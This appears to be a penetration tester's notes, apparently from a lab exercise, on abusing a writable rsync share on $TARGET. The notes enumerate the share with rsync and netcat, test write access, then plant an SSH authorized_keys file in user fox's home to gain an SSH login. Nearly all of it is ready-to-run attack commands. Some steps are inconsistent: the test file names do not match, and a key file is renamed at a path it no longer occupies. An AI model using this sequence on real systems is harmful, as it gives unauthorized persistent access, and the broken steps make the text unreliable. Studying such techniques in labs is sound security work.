#### SSH key upload
```bash - kali
rsync rsync://$TARGET
```
`fox          fox home`
```bash - kali
rsync rsync://$TARGET/fox
```
Download share with it's contents:
```bash - kali
rsync -av rsync://$TARGET/fox ./rsyncfiles
```
Test to see if we can upload files:
```bash - kali
echo "test" > test
```
```bash - kali
rsync -av test.txt rsync://$TARGET/fox
```
```bash - kali
rsync -av --list-only rsync://$TARGET/fox
```
We can see our test file uploaded successfully.
Next, we'll create ssh keys and upload so we can ssh into target:
```bash - kali
ssh-keygen
```
```bash - kali
cp /home/kali/.ssh/id_rsa* .
```
```bash - kali
mkdir .ssh && mv id_rsa* .ssh
```
Change the public key to authorized_keys
```bash - kali
mv id_rsa.pub authorized_keys
```
Transfer the key files to the target like so:
```bash - kali
rsync -a --relative ./.ssh  rsync://$TARGET/fox/
```
```bash - kali
ssh fox@$TARGET
```
---
#### nc enumeration
```
nc -nvv $TARGET 873
```
```
@RSYNCD: 31.0
```
```
#list
```
Now lets try to enumerate "fox"
```
nc -nvv $TARGET 873
```
```
@RSYNCD: 31.0
```
```
fox
```
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
